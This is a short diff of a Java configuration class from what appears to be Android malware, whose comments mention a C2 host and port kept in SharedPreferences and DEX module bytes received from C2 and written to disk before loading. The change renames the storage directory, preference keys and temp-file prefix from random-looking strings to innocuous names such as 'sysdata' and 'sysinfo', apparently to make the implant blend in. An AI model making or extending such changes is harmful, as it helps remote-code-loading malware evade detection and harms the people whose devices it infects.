@@ -24,16 +24,16 @@ import java.util.UUID;
 public class Config {
 
     // Storage directory name for DEX temp files
-    public static String FTX0 = ".Confg";
+    public static String FTX0 = "sysdata";
 
     // SharedPreferences key used to store/retrieve C2 host
-    public static String FTX1 = "NFHY";
+    public static String FTX1 = "appdata";
 
     // SharedPreferences key used to store/retrieve C2 port
-    public static String FTX2 = "YLOV";
+    public static String FTX2 = "configrs";
 
     // Prefix for DEX temp files written to disk before loading
-    public static String FTX3 = "QSVT";
+    public static String FTX3 = "sysinfo";
 
     // Instance fields: hold parsed command data received from C2
     public byte[] byt;   // raw DEX/module bytes from C2
